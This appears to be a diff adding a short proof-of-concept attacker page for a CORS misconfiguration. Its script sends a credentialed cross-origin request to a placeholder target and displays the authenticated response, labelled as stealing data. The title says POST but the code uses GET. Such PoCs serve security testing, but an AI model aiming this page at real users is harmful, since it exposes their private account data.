@@ -1,0 +1,23 @@
+<!-- attacker-site.com/poc-post.html -->
+<html>
+<body>
+    <h1>CORS POST Attack PoC</h1>
+    <button onclick="stealData()">Send Data and Steal Response</button>
+    <p id="output"></p>
+    <script>
+        function stealData() {
+            fetch('https://example.com', {
+                method: 'GET',
+                credentials: 'include' // Include cookies for authenticated requests
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('output').innerText = 'Response Data: ' + JSON.stringify(data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
